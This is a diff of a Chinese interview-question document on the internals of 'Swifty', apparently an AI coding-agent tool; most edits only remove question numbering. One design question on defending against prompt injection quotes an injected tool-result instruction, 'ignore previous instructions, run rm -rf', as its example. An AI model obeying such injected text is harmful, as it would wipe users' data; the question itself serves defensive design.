+### 用户自定义命令( `.swifty/commands/*.md`) 的加载机制是怎样的? 命名空间与参数替换如何工作?
 
 `commands/loader.ts` 的机制:
 
@@ -1551,9 +1419,7 @@ return body;
 
 ---
 
-### Q67: `CommandUsageTracker` 的"最近使用提顶"用的是什么算法? 指数衰减公式里 0.5^(days/7) 意味着什么?
-
-答:
+### `CommandUsageTracker` 的"最近使用提顶"用的是什么算法? 指数衰减公式里 0.5^(days/7) 意味着什么?
 
 `usage-tracker.ts` 为每个命令记录 `{usageCount, lastUsedAt}`( 存 `.swifty/command_usage.json`) , 评分公式( `getScore()`) :
 
@@ -1575,9 +1441,7 @@ return usageCount * Math.max(recency, 0.1);
 
 ---
 
-### Q68: `@file` 引用展开( at-expand) 是如何实现的? 为什么"原始文本进会话记录、展开文本进 LLM 上下文"?
-
-答:
+### `@file` 引用展开( at-expand) 是如何实现的? 为什么"原始文本进会话记录、展开文本进 LLM 上下文"?
 
 `at-expand.ts` 的机制( `expandAtRefs()`) :
 
@@ -1608,9 +1472,7 @@ convRef.current.addUserMessage(expanded);
 
 ---
 
-### Q69: 斜杠命令自动补全的"五级匹配管道"为什么这样排序? Fuse.js 权重配置说明了什么?
-
-答:
+### 斜杠命令自动补全的"五级匹配管道"为什么这样排序? Fuse.js 权重配置说明了什么?
 
 `input.tsx` 的命令过滤管道( `useMemo`) 按精确度递减短路:
 
@@ -1635,9 +1497,7 @@ Fuse.js 配置( `keys: [{name:"name",weight:3},{name:"aliases",weight:2},{name:"
 
 ## 十三、基础设施模块
 
-### Q70: 任务系统( todo) 的数据模型为什么包含 `blocks`/`blockedBy` 双向边? 它的工具为什么只标记 `category: "read"`?
-
-答:
+### 任务系统( todo) 的数据模型为什么包含 `blocks`/`blockedBy` 双向边? 它的工具为什么只标记 `category: "read"`?
 
 数据模型( `todo/todo.ts`) : Task 含 `id/subject/description/status(pending|in_progress|completed)/owner/blocks[]/blockedBy[]/metadata`, 存储是 `.swifty/tasks/{sessionId}.json`( 注意是 JSON 不是 JSONL) , `TaskList` 内存 Map + 每次变更后全量 `persist()`.
 
@@ -1651,9 +1511,7 @@ Fuse.js 配置( `keys: [{name:"name",weight:3},{name:"aliases",weight:2},{name:"
 
 ---
 
-### Q71: worktree 模块为什么要实现"纯文件系统的 git HEAD 读取"? `.worktreeinclude` 解决什么痛点?
-
-答:
+### worktree 模块为什么要实现"纯文件系统的 git HEAD 读取"? `.worktreeinclude` 解决什么痛点?
 
 `worktree/worktree.ts` 的 `readWorktreeHeadSha()`( 目标 ≤10ms) 完全不起 git 进程, 直接解析 git 内部文件:
 
@@ -1670,9 +1528,7 @@ Fuse.js 配置( `keys: [{name:"name",weight:3},{name:"aliases",weight:2},{name:"
 
 ---
 
-### Q72: logger 系统的 Proxy 惰性初始化、模块级 child logger 分别解决了什么问题?
-
-答:
+### logger 系统的 Proxy 惰性初始化、模块级 child logger 分别解决了什么问题?
 
 Proxy 惰性初始化( `logger.ts:216`) :
 
@@ -1697,9 +1553,7 @@ export const logger = new Proxy(silentFallback, {
 
 ---
 
-### Q73: plan-file 的"形容词-名词-时间戳"命名与路径穿越防护细节是什么?
-
-答:
+### plan-file 的"形容词-名词-时间戳"命名与路径穿越防护细节是什么?
 
 `plan-file/plan-file.ts`:
 
@@ -1715,9 +1569,7 @@ export const logger = new Proxy(silentFallback, {
 
 ---
 
-### Q74: prompt history 的持久化为什么"每次追加都全量重写"? 这不是违背了追加写原则吗?
-
-答:
+### prompt history 的持久化为什么"每次追加都全量重写"? 这不是违背了追加写原则吗?
 
 `history.ts` 确实是每次 `append()` 都 load 全部 → push → trim 到 `MAX_ENTRIES = 200` → 全量重写 `prompt_history.jsonl`. 表面看与 Q48 推崇的追加写矛盾, 实际是一致原则的正确应用:
 
@@ -1731,9 +1583,7 @@ export const logger = new Proxy(silentFallback, {
 
 ---
 
-### Q75: `model-resolver` 的别名机制与 `createModelResolver` 闭包工厂各自解决什么问题?
-
-答:
+### `model-resolver` 的别名机制与 `createModelResolver` 闭包工厂各自解决什么问题?
 
 `model-resolver.ts` 两个层次:
 
@@ -1753,9 +1603,7 @@ export const logger = new Proxy(silentFallback, {
 
 ## 十四、会话生命周期命令
 
-### Q76: `/resume` 恢复会话时, "对话状态"与"UI 状态"分别是如何重建的?
-
-答:
+### `/resume` 恢复会话时, "对话状态"与"UI 状态"分别是如何重建的?
 
 `/resume <id>` 的重建( `app.tsx:983`) 是双轨的:
 
@@ -1778,9 +1626,7 @@ UI 状态重建( 用户看到的画面) :
 
 ---
 
-### Q77: `/clear` 与 `/compact` 都用于"控制上下文体积", 它们的实现与语义有何本质不同?
-
-答:
+### `/clear` 与 `/compact` 都用于"控制上下文体积", 它们的实现与语义有何本质不同?
 
 | 维度         | `/clear`                                    | `/compact`                               |
 | ------------ | ------------------------------------------- | ---------------------------------------- |
@@ -1802,9 +1648,7 @@ UI 状态重建( 用户看到的画面) :
 
 ---
 
-### Q78: 命令体系在 TUI 与 remote 两种宿主下的"同与异"给了我们什么关于多端架构的启示?
-
-答:
+### 命令体系在 TUI 与 remote 两种宿主下的"同与异"给了我们什么关于多端架构的启示?
 
 同: `CommandRegistry`、`parse()`、handler 签名、local/prompt 类型的业务逻辑完全一致 —— 命令"是什么"由共享层定义.
 
@@ -1824,7 +1668,7 @@ UI 状态重建( 用户看到的画面) :
 
 ## 十五、手写代码题
 
-### Q79: 手写: 实现 Swifty 的 50ms 流式节流( coalescing throttle) .
+### 手写: 实现 Swifty 的 50ms 流式节流( coalescing throttle) .
 
 题目: 事件源高频回调 `onDelta(text)`, 要求渲染函数 `render(fullText)` 每 50ms 最多执行一次, 且必须渲染最新完整文本, 结束时不能丢尾部.
 
@@ -1864,7 +1708,7 @@ function createStreamThrottle(render: (text: string) => void, interval = 50) {
 
 ---
 
-### Q80: 手写: 实现 `partitionToolCalls()`( 工具分批调度) .
+### 手写: 实现 `partitionToolCalls()`( 工具分批调度) .
 
 题目: 给定工具调用列表与查询 `category(name)` 的函数, 把列表划分为批次: 连续的 read 调用合并为一个并行批, 其他调用各自单独成批, 保持原有相对顺序.
 
@@ -1892,7 +1736,7 @@ function partition(calls: string[], category: (n: string) => string): Batch[] {
 
 ---
 
-### Q81: 手写: 实现 `computeKeepStartIndex()`( 压缩保留尾部边界计算) .
+### 手写: 实现 `computeKeepStartIndex()`( 压缩保留尾部边界计算) .
 
 题目: 给定消息数组与每条消息的 token 估算函数, 从尾部向前选出一个连续子段, 满足: ① token 总量 ≥ 10K 或条数 ≥ 5( 先到即停) ; ② 总量不得超过 40K; ③ 返回子段起始下标.
 
@@ -1924,7 +1768,7 @@ function computeKeepStartIndex(
 
 ---
 
-### Q82: 手写: 实现"稳定前缀缓存"的增量 markdown 渲染.
+### 手写: 实现"稳定前缀缓存"的增量 markdown 渲染.
 
 题目: 流式文本逐帧增长, markdown 解析昂贵. 实现一个渲染器: 已闭合段落( 以 `\n\n` 结尾的前缀) 只解析一次并缓存, 仅尾部进行中段落逐帧重解析.
 
@@ -1956,7 +1800,7 @@ function createIncrementalMarkdown(parse: (src: string) => string) {
 
 ---
 
-### Q83: 手写: 实现文件邮箱的互斥锁( O_EXCL 锁文件 + stale 检测 + 退避) .
+### 手写: 实现文件邮箱的互斥锁( O_EXCL 锁文件 + stale 检测 + 退避) .
 
 题目: 多进程向同一 JSON 数组文件追加消息, 要求互斥. 用 `wx`( 排他创建) 锁文件实现 `withLock(fn)`: 总获取超时 5 秒( 超时抛错而非静默丢消息) , 锁文件超过 10 秒视为 stale 可强取, 重试用指数退避加抖动( 5ms 起、上限 80ms) 的同步等待.
 
@@ -2017,7 +1861,7 @@ function withLock<T>(lockPath: string, fn: () => T): T {
 
 ---
 
-### Q84: 手写: 实现 Promise 悬挂桥( 把"等待用户选择"注入异步流程) .
+### 手写: 实现 Promise 悬挂桥( 把"等待用户选择"注入异步流程) .
 
 题目: UI 层要提供 `ask(): Promise<Choice>` 给业务层 `await`, 选择由对话框异步产生. 实现这个桥, 要求支持取消( 对话框被 dismiss 时 Promise reject) .
 
@@ -2059,7 +1903,7 @@ class PendingDialog<C> {
 
 ---
 
-### Q85: 手写: 用 useReducer 实现多问题向导( AskUserDialog 的简化版) .
+### 手写: 用 useReducer 实现多问题向导( AskUserDialog 的简化版) .
 
 题目: N 个问题, 每题若干选项; 支持 next/prev/update/跳转, 最后一页提交. 写出 state、actions、reducer 骨架.
 
@@ -2102,7 +1946,7 @@ function reducer(state: State, action: Action, questions: Q[]): State {
 
 ---
 
-### Q86: 手写: 实现 UsageAnchor 的 token 估算( 真实锚点 + 增量字符估算) .
+### 手写: 实现 UsageAnchor 的 token 估算( 真实锚点 + 增量字符估算) .
 
 题目: 对话历史持续增长, 每次 LLM 响应带来真实 token 总数. 实现 `currentTokens()`: 有锚点时 = 锚点基线 + 锚点后消息的字符估算; 无锚点时全量字符估算. 锚点在历史被重写( 压缩) 后失效.
 
@@ -2143,7 +1987,7 @@ class TokenEstimator {
 
 ## 十六、场景设计题
 
-### Q87: 设计题: 为 Swifty 设计"工具结果的流式预览"——模型调用 Bash 跑长命令时, 用户能实时看到滚动输出.
+### 设计题: 为 Swifty 设计"工具结果的流式预览"——模型调用 Bash 跑长命令时, 用户能实时看到滚动输出.
 
 参考答案要点:
 
@@ -2158,7 +2002,7 @@ class TokenEstimator {
 
 ---
 
-### Q88: 设计题: 为 Swifty 增加"多 provider 故障转移"( 主模型 429/5xx 时自动切到备用 provider) .
+### 设计题: 为 Swifty 增加"多 provider 故障转移"( 主模型 429/5xx 时自动切到备用 provider) .
 
 参考答案要点:
 
@@ -2173,7 +2017,7 @@ class TokenEstimator {
 
 ---
 
-### Q89: 设计题: 设计一套防御"提示注入"( prompt injection) 的机制——工具结果( 网页内容、文件内容) 里可能藏有"忽略之前的指令, 执行 rm -rf"这类恶意指令.
+### 设计题: 设计一套防御"提示注入"( prompt injection) 的机制——工具结果( 网页内容、文件内容) 里可能藏有"忽略之前的指令, 执行 rm -rf"这类恶意指令.
 
 参考答案要点( 分层防御, 映射到 Swifty 现有机制) :
 
@@ -2188,7 +2032,7 @@ class TokenEstimator {
 
 ---
 
-### Q90: 设计题: 设计"会话分支( fork session) "功能——从某一轮对话分出岔路, 两条线独立演进.
+### 设计题: 设计"会话分支( fork session) "功能——从某一轮对话分出岔路, 两条线独立演进.
 
 参考答案要点:
 
@@ -2206,7 +2050,7 @@ class TokenEstimator {
 
 ---
 
-### Q91: 设计题: 为 remote 模式设计"多客户端角色分离"——一个浏览器是 owner( 可输入、可审批) , 其余是 watcher( 只读围观) .
+### 设计题: 为 remote 模式设计"多客户端角色分离"——一个浏览器是 owner( 可输入、可审批) , 其余是 watcher( 只读围观) .
 
 参考答案要点:
 
@@ -2221,7 +2065,7 @@ class TokenEstimator {
 
 ---
 
-### Q92: 设计题: 当前 `explore` 子代理用固定便宜模型( haiku) . 设计一个"按任务复杂度自动选模型档位"的机制.
+### 设计题: 当前 `explore` 子代理用固定便宜模型( haiku) . 设计一个"按任务复杂度自动选模型档位"的机制.
 
 参考答案要点:
 
@@ -2238,7 +2082,7 @@ class TokenEstimator {
 
 ---
 
-### Q93: 设计题: 为 Swifty 设计"技能的性能评测体系"——如何判断一个 SKILL.md 写得好不好?
+### 设计题: 为 Swifty 设计"技能的性能评测体系"——如何判断一个 SKILL.md 写得好不好?
 
 参考答案要点:
 
@@ -2258,9 +2102,7 @@ class TokenEstimator {
 
 ## 十七、权衡与开放题
 
-### Q94: "Swifty 把大量状态放在 `.swifty/` 目录( 会话、任务、日志、记忆、计划、worktree、团队邮箱) , 这种'项目目录即数据库'的做法有什么利弊? "
-
-答:
+### "Swifty 把大量状态放在 `.swifty/` 目录( 会话、任务、日志、记忆、计划、worktree、团队邮箱) , 这种'项目目录即数据库'的做法有什么利弊? "
 
 利:
 
@@ -2279,9 +2121,7 @@ class TokenEstimator {
 
 ---
 
-### Q95: "系统中多处出现'best-effort'( 尽力而为) 的注释——记忆提取失败静默、日志清理失败静默、MCP 连接失败仅警告. 这种失败处理哲学是否过于宽松? 边界在哪里? "
-
-答:
+### "系统中多处出现'best-effort'( 尽力而为) 的注释——记忆提取失败静默、日志清理失败静默、MCP 连接失败仅警告. 这种失败处理哲学是否过于宽松? 边界在哪里? "
 
 这不是宽松, 是精确的核心/外围区分. 判断准则: 该失败是否阻断用户的核心任务( 与 LLM 对话完成编码) ?
 
@@ -2304,9 +2144,7 @@ class TokenEstimator {
 
 ---
 
-### Q96: "如果让你把 Swifty 的 TUI 移植到浏览器( web 版) , 哪些模块可以零修改复用? 哪些必须重写? 架构上印证了什么? "
-
-答:
+### "如果让你把 Swifty 的 TUI 移植到浏览器( web 版) , 哪些模块可以零修改复用? 哪些必须重写? 架构上印证了什么? "
 
 零修改复用( 约 80% 的代码量) :
 
@@ -2322,9 +2160,7 @@ class TokenEstimator {
 
 ---
 
-### Q97: "项目中既有 Zod 运行时校验, 又有 TypeScript 静态类型. 二者的分工边界在哪里? "
-
-答:
+### "项目中既有 Zod 运行时校验, 又有 TypeScript 静态类型. 二者的分工边界在哪里? "
 
 分工原则: 静态类型管"内部信任边界内", Zod 管"外部信任边界".
 
@@ -2347,9 +2183,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 ---
 
-### Q98: "`app.tsx` 中大量服务实例( client、registry、conv、teamManager…) 用 useRef 持有而不是 useState 或 Context. 如何论证这不是反模式? "
-
-答:
+### "`app.tsx` 中大量服务实例( client、registry、conv、teamManager…) 用 useRef 持有而不是 useState 或 Context. 如何论证这不是反模式? "
 
 论证分三层:
 
@@ -2361,9 +2195,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 ---
 
-### Q99: "回顾整个项目, 你认为技术债务最明显的三处在哪里? 如何排期偿还? "
-
-答:
+### "回顾整个项目, 你认为技术债务最明显的三处在哪里? 如何排期偿还? "
 
 基于源码观察的三处( 需要展现"既欣赏设计也能直面问题") :
 
@@ -2375,9 +2207,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 ---
 
-### Q100: "最后一个问题: 如果只用三分钟向 CTO 介绍这个项目, 你会怎么讲? "
-
-答:
+### "最后一个问题: 如果只用三分钟向 CTO 介绍这个项目, 你会怎么讲? "
 
 参考话术( 体现"提炼本质"的能力) :
 
@@ -2397,9 +2227,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 ## 十八、补充子系统: MCP 加载策略、图像、IDE 集成与代码评审
 
-### Q101: MCP 工具进入上下文的方式有哪三种模式? 为什么 tools 数组的稳定性如此重要?
-
-答:
+### MCP 工具进入上下文的方式有哪三种模式? 为什么 tools 数组的稳定性如此重要?
 
 `mcp/strategy.ts` 的 `decideAndApply()` 在 MCP 连接完成、全部内置工具注册之后执行一次( 时机刻意靠后: 模式判定要拿"全部工具 schema 总量"与上下文窗口比较) , 三种模式:
 
@@ -2409,9 +2237,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 为什么如此在意 tools 数组的稳定性 —— strategy.ts:37-40 的注释给出了实测数据: tools 渲染在 system 之后、messages 之前, 数组任何变化都会使其后全部对话历史的 prompt cache 失效; 在一个 2 万 token 历史的会话里, 向 tools 末尾追加一个工具, 缓存命中率从 99.4% 跌到 9.5%, 等于全量重算. 所以 `exposeToolSearch`/`exposeMcpCall` 两个开关也是本模式判定时一次性算好并整个会话固定( registry.ts:41-49 注释) , 避免"会话中途 tools[] 变化". 这是"用数据说话的缓存工程"范例.
 
-### Q102: 图像支持是如何实现的? 从剪贴板粘贴到进入 LLM 上下文要经过哪些关卡?
-
-答:
+### 图像支持是如何实现的? 从剪贴板粘贴到进入 LLM 上下文要经过哪些关卡?
 
 链路( `images/image.ts` + `images/clipboard.ts` + `tui/input.tsx` + `tui/at-expand.ts`) :
 
@@ -2423,9 +2249,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 这是一个典型的"多级降级管道": 每一关( 格式、体积、尺寸、数量) 都有明确上限与对应的降级动作, 而不是一刀切报错.
 
-### Q103: VSCode/IDE 集成是如何实现的? `@file#L3-10` 行号引用从哪来?
-
-答:
+### VSCode/IDE 集成是如何实现的? `@file#L3-10` 行号引用从哪来?
 
 `src/vscode/` 三个模块复用了 Claude Code 扩展的内嵌 MCP 服务器:
 
@@ -2435,9 +2259,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 工程启示: 不重新发明 IDE 协议, 直接寄生在已有生态的发现机制( 锁文件 + 环境变量) 上, 用最小代码( 三个文件) 拿到"编辑器选中代码 → 终端 Agent 精确上下文"的高价值体验.
 
-### Q104: `/review` 与 `/code-review` 是什么关系? 代码评审子系统如何用团队机制实现多角色评审?
-
-答:
+### `/review` 与 `/code-review` 是什么关系? 代码评审子系统如何用团队机制实现多角色评审?
 
 两条产品路径:
 
